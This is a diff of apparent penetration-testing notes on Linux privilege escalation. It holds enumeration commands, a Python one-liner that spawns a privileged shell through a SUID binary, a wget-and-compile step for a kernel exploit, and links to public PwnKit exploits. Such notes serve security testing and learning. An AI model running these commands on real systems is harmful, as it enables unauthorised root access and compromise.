@@ -1,11 +1,10 @@
 
-INPUT: Shell
+INPUT: Stablished shell
 PROCESS:
-- Stablish Shell
 - Privilege Escalation
 - Maintain Access
 TOOLS
-- https://gtfobins.github.io/
+- GTFOBins
 OUPUT: 
 - root shell
 
@@ -13,9 +12,7 @@ OUPUT:
 
 ## Privilege Escalation
 getcap -r / 2>/dev/null
-
 Python Library Hijacking on Linux
-
 [SUID] find / -perm /4000 2>/dev/null
     - [python] <python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'>
 [sudo] <id; sudo -l; sudo -V>
@@ -42,4 +39,10 @@ find / -perm -u=s -type f 2>/dev/null
 
 [cve-2017-16995]
     wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
-    gcc --static cve-2017-16995.c -o cve-2017-16995    
+    gcc --static cve-2017-16995.c -o cve-2017-16995
+[CVE-2021-4034]
+    https://www.exploit-db.com/exploits/50689
+    https://github.com/ryaagard/CVE-2021-4034
+    https://github.com/c3c/CVE-2021-4034
+[GTFOBins]
+    https://gtfobins.github.io/
